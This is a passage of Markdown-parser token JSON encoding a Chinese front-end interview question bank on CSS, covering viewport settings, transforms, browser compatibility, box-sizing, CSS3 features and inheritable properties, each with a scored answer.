布局：更加现代和灵活，适用于一维布局\\n","task":false,"loose":false,"text":"**1：** flex 布局：更加现代和灵活，适用于一维布局","tokens":[{"type":"text","raw":"**1：** flex 布局：更加现代和灵活，适用于一维布局","text":"**1：** flex 布局：更加现代和灵活，适用于一维布局","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" flex 布局：更加现代和灵活，适用于一维布局","text":" flex 布局：更加现代和灵活，适用于一维布局","escaped":false}]}]},{"type":"list_item","raw":"- **1：** grid 布局：二维布局，支持更复杂的布局","task":false,"loose":false,"text":"**1：** grid 布局：二维布局，支持更复杂的布局","tokens":[{"type":"text","raw":"**1：** grid 布局：二维布局，支持更复杂的布局","text":"**1：** grid 布局：二维布局，支持更复杂的布局","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" grid 布局：二维布局，支持更复杂的布局","text":" grid 布局：二维布局，支持更复杂的布局","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10 .什么是 viewport？如何在页面中设置视口大小？\\n\\n","depth":2,"text":"10 .什么是 viewport？如何在页面中设置视口大小？","tokens":[{"type":"text","raw":"10 .什么是 viewport？如何在页面中设置视口大小？","text":"10 .什么是 viewport？如何在页面中设置视口大小？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","task":false,"loose":false,"text":"**1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","tokens":[{"type":"text","raw":"**1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","text":"**1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 视口是用户可以看到的网页区域。设置视口的常见做法是在 ","text":" 视口是用户可以看到的网页区域。设置视口的常见做法是在 ","escaped":false},{"type":"codespan","raw":"`<head>`","text":"<head>"},{"type":"text","raw":" 中添加如下标签","text":" 中添加如下标签","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n```","lang":"html","text":"  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 11. 解释 transform、translate、scale、rotate 等属性的使用？\\n\\n","depth":2,"text":"11. 解释 transform、translate、scale、rotate 等属性的使用？","tokens":[{"type":"text","raw":"11. 解释 transform、translate、scale、rotate 等属性的使用？","text":"11. 解释 transform、translate、scale、rotate 等属性的使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。\\n- **1：** translate(x, y)：平移元素\\n- **1：** rotate(deg)：旋转元素。\\n- **1：** scale(x, y)：缩放元素。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。\\n","task":false,"loose":false,"text":"**1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","tokens":[{"type":"text","raw":"**1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","text":"**1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","text":" transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** translate(x, y)：平移元素\\n","task":false,"loose":false,"text":"**1：** translate(x, y)：平移元素","tokens":[{"type":"text","raw":"**1：** translate(x, y)：平移元素","text":"**1：** translate(x, y)：平移元素","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" translate(x, y)：平移元素","text":" translate(x, y)：平移元素","escaped":false}]}]},{"type":"list_item","raw":"- **1：** rotate(deg)：旋转元素。\\n","task":false,"loose":false,"text":"**1：** rotate(deg)：旋转元素。","tokens":[{"type":"text","raw":"**1：** rotate(deg)：旋转元素。","text":"**1：** rotate(deg)：旋转元素。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" rotate(deg)：旋转元素。","text":" rotate(deg)：旋转元素。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** scale(x, y)：缩放元素。","task":false,"loose":false,"text":"**1：** scale(x, y)：缩放元素。","tokens":[{"type":"text","raw":"**1：** scale(x, y)：缩放元素。","text":"**1：** scale(x, y)：缩放元素。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" scale(x, y)：缩放元素。","text":" scale(x, y)：缩放元素。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 12. 如何处理浏览器兼容性问题？\\n\\n","depth":2,"text":"12. 如何处理浏览器兼容性问题？","tokens":[{"type":"text","raw":"12. 如何处理浏览器兼容性问题？","text":"12. 如何处理浏览器兼容性问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。\\n- **1：** 使用 Autoprefixer 等工具自动添加前缀。\\n- **1：** 测试多个浏览器，确保关键功能正常\\n- **1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。\\n","task":false,"loose":false,"text":"**1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","tokens":[{"type":"text","raw":"**1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","text":"**1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","text":" 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用 Autoprefixer 等工具自动添加前缀。\\n","task":false,"loose":false,"text":"**1：** 使用 Autoprefixer 等工具自动添加前缀。","tokens":[{"type":"text","raw":"**1：** 使用 Autoprefixer 等工具自动添加前缀。","text":"**1：** 使用 Autoprefixer 等工具自动添加前缀。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 Autoprefixer 等工具自动添加前缀。","text":" 使用 Autoprefixer 等工具自动添加前缀。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 测试多个浏览器，确保关键功能正常\\n","task":false,"loose":false,"text":"**1：** 测试多个浏览器，确保关键功能正常","tokens":[{"type":"text","raw":"**1：** 测试多个浏览器，确保关键功能正常","text":"**1：** 测试多个浏览器，确保关键功能正常","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 测试多个浏览器，确保关键功能正常","text":" 测试多个浏览器，确保关键功能正常","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","task":false,"loose":false,"text":"**1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","tokens":[{"type":"text","raw":"**1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","text":"**1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","text":" 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 13. box-sizing: border-box 和 content-box 的区别？\\n\\n","depth":2,"text":"13. box-sizing: border-box 和 content-box 的区别？","tokens":[{"type":"text","raw":"13. box-sizing: border-box 和 content-box 的区别？","text":"13. box-sizing: border-box 和 content-box 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。\\n- **1：** border-box：width 和 height 包括内容区域、padding 和 border。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。\\n","task":false,"loose":false,"text":"**1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","tokens":[{"type":"text","raw":"**1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","text":"**1：** content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","text":" content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** border-box：width 和 height 包括内容区域、padding 和 border。","task":false,"loose":false,"text":"**1：** border-box：width 和 height 包括内容区域、padding 和 border。","tokens":[{"type":"text","raw":"**1：** border-box：width 和 height 包括内容区域、padding 和 border。","text":"**1：** border-box：width 和 height 包括内容区域、padding 和 border。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" border-box：width 和 height 包括内容区域、padding 和 border。","text":" border-box：width 和 height 包括内容区域、padding 和 border。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 14. CSS3有哪些重要的新特性？\\n\\n","depth":2,"text":"14. CSS3有哪些重要的新特性？","tokens":[{"type":"text","raw":"14. CSS3有哪些重要的新特性？","text":"14. CSS3有哪些重要的新特性？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 选择器和伪类：\\n  + 属性选择器增强\\n  + 新增伪类：:nth-child()、:first-of-type等\\n  + 伪元素使用双冒号::before\\n\\n- **1：** 视觉效果：\\n  + 圆角(border-radius)\\n  + 阴影(text-shadow/box-shadow)\\n  + 渐变(linear-gradient/radial-gradient)\\n  + RGBA和HSLA颜色\\n  + 不透明度(opacity)\\n\\n- **1：** 转换和动画：\\n  + 2D/3D转换(transform)\\n  + 过渡效果(transition)\\n  + 动画效果(animation/@keyframes)\\n\\n- **1：** 布局能力：\\n  + 弹性布局(display: flex)\\n  + 网格布局(display: grid)\\n  + 多列布局(column-count)\\n  + 盒模型调整(box-sizing)\\n\\n- **1：** 响应式设计：\\n  + 媒体查询(@media)\\n  + 视口单位(vh/vw)\\n  + 图像适配(object-fit)\\n  + 自定义属性(变量)","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 选择器和伪类：\\n  + 属性选择器增强\\n  + 新增伪类：:nth-child()、:first-of-type等\\n  + 伪元素使用双冒号::before\\n\\n","task":false,"loose":true,"text":"**1：** 选择器和伪类：\\n+ 属性选择器增强\\n+ 新增伪类：:nth-child()、:first-of-type等\\n+ 伪元素使用双冒号::before\\n","tokens":[{"type":"text","raw":"**1：** 选择器和伪类：\\n","text":"**1：** 选择器和伪类：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 选择器和伪类：","text":" 选择器和伪类：","escaped":false}]},{"type":"list","raw":"+ 属性选择器增强\\n+ 新增伪类：:nth-child()、:first-of-type等\\n+ 伪元素使用双冒号::before\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 属性选择器增强\\n","task":false,"loose":false,"text":"属性选择器增强","tokens":[{"type":"text","raw":"属性选择器增强","text":"属性选择器增强","tokens":[{"type":"text","raw":"属性选择器增强","text":"属性选择器增强","escaped":false}]}]},{"type":"list_item","raw":"+ 新增伪类：:nth-child()、:first-of-type等\\n","task":false,"loose":false,"text":"新增伪类：:nth-child()、:first-of-type等","tokens":[{"type":"text","raw":"新增伪类：:nth-child()、:first-of-type等","text":"新增伪类：:nth-child()、:first-of-type等","tokens":[{"type":"text","raw":"新增伪类：:nth-child()、:first-of-type等","text":"新增伪类：:nth-child()、:first-of-type等","escaped":false}]}]},{"type":"list_item","raw":"+ 伪元素使用双冒号::before","task":false,"loose":false,"text":"伪元素使用双冒号::before","tokens":[{"type":"text","raw":"伪元素使用双冒号::before","text":"伪元素使用双冒号::before","tokens":[{"type":"text","raw":"伪元素使用双冒号::before","text":"伪元素使用双冒号::before","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 视觉效果：\\n  + 圆角(border-radius)\\n  + 阴影(text-shadow/box-shadow)\\n  + 渐变(linear-gradient/radial-gradient)\\n  + RGBA和HSLA颜色\\n  + 不透明度(opacity)\\n\\n","task":false,"loose":true,"text":"**1：** 视觉效果：\\n+ 圆角(border-radius)\\n+ 阴影(text-shadow/box-shadow)\\n+ 渐变(linear-gradient/radial-gradient)\\n+ RGBA和HSLA颜色\\n+ 不透明度(opacity)\\n","tokens":[{"type":"text","raw":"**1：** 视觉效果：\\n","text":"**1：** 视觉效果：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 视觉效果：","text":" 视觉效果：","escaped":false}]},{"type":"list","raw":"+ 圆角(border-radius)\\n+ 阴影(text-shadow/box-shadow)\\n+ 渐变(linear-gradient/radial-gradient)\\n+ RGBA和HSLA颜色\\n+ 不透明度(opacity)\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 圆角(border-radius)\\n","task":false,"loose":false,"text":"圆角(border-radius)","tokens":[{"type":"text","raw":"圆角(border-radius)","text":"圆角(border-radius)","tokens":[{"type":"text","raw":"圆角(border-radius)","text":"圆角(border-radius)","escaped":false}]}]},{"type":"list_item","raw":"+ 阴影(text-shadow/box-shadow)\\n","task":false,"loose":false,"text":"阴影(text-shadow/box-shadow)","tokens":[{"type":"text","raw":"阴影(text-shadow/box-shadow)","text":"阴影(text-shadow/box-shadow)","tokens":[{"type":"text","raw":"阴影(text-shadow/box-shadow)","text":"阴影(text-shadow/box-shadow)","escaped":false}]}]},{"type":"list_item","raw":"+ 渐变(linear-gradient/radial-gradient)\\n","task":false,"loose":false,"text":"渐变(linear-gradient/radial-gradient)","tokens":[{"type":"text","raw":"渐变(linear-gradient/radial-gradient)","text":"渐变(linear-gradient/radial-gradient)","tokens":[{"type":"text","raw":"渐变(linear-gradient/radial-gradient)","text":"渐变(linear-gradient/radial-gradient)","escaped":false}]}]},{"type":"list_item","raw":"+ RGBA和HSLA颜色\\n","task":false,"loose":false,"text":"RGBA和HSLA颜色","tokens":[{"type":"text","raw":"RGBA和HSLA颜色","text":"RGBA和HSLA颜色","tokens":[{"type":"text","raw":"RGBA和HSLA颜色","text":"RGBA和HSLA颜色","escaped":false}]}]},{"type":"list_item","raw":"+ 不透明度(opacity)","task":false,"loose":false,"text":"不透明度(opacity)","tokens":[{"type":"text","raw":"不透明度(opacity)","text":"不透明度(opacity)","tokens":[{"type":"text","raw":"不透明度(opacity)","text":"不透明度(opacity)","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 转换和动画：\\n  + 2D/3D转换(transform)\\n  + 过渡效果(transition)\\n  + 动画效果(animation/@keyframes)\\n\\n","task":false,"loose":true,"text":"**1：** 转换和动画：\\n+ 2D/3D转换(transform)\\n+ 过渡效果(transition)\\n+ 动画效果(animation/@keyframes)\\n","tokens":[{"type":"text","raw":"**1：** 转换和动画：\\n","text":"**1：** 转换和动画：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 转换和动画：","text":" 转换和动画：","escaped":false}]},{"type":"list","raw":"+ 2D/3D转换(transform)\\n+ 过渡效果(transition)\\n+ 动画效果(animation/@keyframes)\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 2D/3D转换(transform)\\n","task":false,"loose":false,"text":"2D/3D转换(transform)","tokens":[{"type":"text","raw":"2D/3D转换(transform)","text":"2D/3D转换(transform)","tokens":[{"type":"text","raw":"2D/3D转换(transform)","text":"2D/3D转换(transform)","escaped":false}]}]},{"type":"list_item","raw":"+ 过渡效果(transition)\\n","task":false,"loose":false,"text":"过渡效果(transition)","tokens":[{"type":"text","raw":"过渡效果(transition)","text":"过渡效果(transition)","tokens":[{"type":"text","raw":"过渡效果(transition)","text":"过渡效果(transition)","escaped":false}]}]},{"type":"list_item","raw":"+ 动画效果(animation/@keyframes)","task":false,"loose":false,"text":"动画效果(animation/@keyframes)","tokens":[{"type":"text","raw":"动画效果(animation/@keyframes)","text":"动画效果(animation/@keyframes)","tokens":[{"type":"text","raw":"动画效果(animation/@keyframes)","text":"动画效果(animation/@keyframes)","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 布局能力：\\n  + 弹性布局(display: flex)\\n  + 网格布局(display: grid)\\n  + 多列布局(column-count)\\n  + 盒模型调整(box-sizing)\\n\\n","task":false,"loose":true,"text":"**1：** 布局能力：\\n+ 弹性布局(display: flex)\\n+ 网格布局(display: grid)\\n+ 多列布局(column-count)\\n+ 盒模型调整(box-sizing)\\n","tokens":[{"type":"text","raw":"**1：** 布局能力：\\n","text":"**1：** 布局能力：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 布局能力：","text":" 布局能力：","escaped":false}]},{"type":"list","raw":"+ 弹性布局(display: flex)\\n+ 网格布局(display: grid)\\n+ 多列布局(column-count)\\n+ 盒模型调整(box-sizing)\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 弹性布局(display: flex)\\n","task":false,"loose":false,"text":"弹性布局(display: flex)","tokens":[{"type":"text","raw":"弹性布局(display: flex)","text":"弹性布局(display: flex)","tokens":[{"type":"text","raw":"弹性布局(display: flex)","text":"弹性布局(display: flex)","escaped":false}]}]},{"type":"list_item","raw":"+ 网格布局(display: grid)\\n","task":false,"loose":false,"text":"网格布局(display: grid)","tokens":[{"type":"text","raw":"网格布局(display: grid)","text":"网格布局(display: grid)","tokens":[{"type":"text","raw":"网格布局(display: grid)","text":"网格布局(display: grid)","escaped":false}]}]},{"type":"list_item","raw":"+ 多列布局(column-count)\\n","task":false,"loose":false,"text":"多列布局(column-count)","tokens":[{"type":"text","raw":"多列布局(column-count)","text":"多列布局(column-count)","tokens":[{"type":"text","raw":"多列布局(column-count)","text":"多列布局(column-count)","escaped":false}]}]},{"type":"list_item","raw":"+ 盒模型调整(box-sizing)","task":false,"loose":false,"text":"盒模型调整(box-sizing)","tokens":[{"type":"text","raw":"盒模型调整(box-sizing)","text":"盒模型调整(box-sizing)","tokens":[{"type":"text","raw":"盒模型调整(box-sizing)","text":"盒模型调整(box-sizing)","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 响应式设计：\\n  + 媒体查询(@media)\\n  + 视口单位(vh/vw)\\n  + 图像适配(object-fit)\\n  + 自定义属性(变量)","task":false,"loose":true,"text":"**1：** 响应式设计：\\n+ 媒体查询(@media)\\n+ 视口单位(vh/vw)\\n+ 图像适配(object-fit)\\n+ 自定义属性(变量)","tokens":[{"type":"text","raw":"**1：** 响应式设计：\\n","text":"**1：** 响应式设计：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 响应式设计：","text":" 响应式设计：","escaped":false}]},{"type":"list","raw":"+ 媒体查询(@media)\\n+ 视口单位(vh/vw)\\n+ 图像适配(object-fit)\\n+ 自定义属性(变量)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 媒体查询(@media)\\n","task":false,"loose":false,"text":"媒体查询(@media)","tokens":[{"type":"text","raw":"媒体查询(@media)","text":"媒体查询(@media)","tokens":[{"type":"text","raw":"媒体查询(@media)","text":"媒体查询(@media)","escaped":false}]}]},{"type":"list_item","raw":"+ 视口单位(vh/vw)\\n","task":false,"loose":false,"text":"视口单位(vh/vw)","tokens":[{"type":"text","raw":"视口单位(vh/vw)","text":"视口单位(vh/vw)","tokens":[{"type":"text","raw":"视口单位(vh/vw)","text":"视口单位(vh/vw)","escaped":false}]}]},{"type":"list_item","raw":"+ 图像适配(object-fit)\\n","task":false,"loose":false,"text":"图像适配(object-fit)","tokens":[{"type":"text","raw":"图像适配(object-fit)","text":"图像适配(object-fit)","tokens":[{"type":"text","raw":"图像适配(object-fit)","text":"图像适配(object-fit)","escaped":false}]}]},{"type":"list_item","raw":"+ 自定义属性(变量)","task":false,"loose":false,"text":"自定义属性(变量)","tokens":[{"type":"text","raw":"自定义属性(变量)","text":"自定义属性(变量)","tokens":[{"type":"text","raw":"自定义属性(变量)","text":"自定义属性(变量)","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 15. CSS哪些属性可以继承\\n\\n","depth":2,"text":"15. CSS哪些属性可以继承","tokens":[{"type":"text","raw":"15. CSS哪些属性可以继承","text":"15. CSS哪些属性可以继承","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 不可继承的\\n\\n  + display\\n    指定元素的显示方式，常见的值包括：\\n    block：块级元素，占据整行\\n    inline：行内元素，只占据必要的宽度，不换行\\n    inline-block：结合了 inline 和 block 的特性\\n    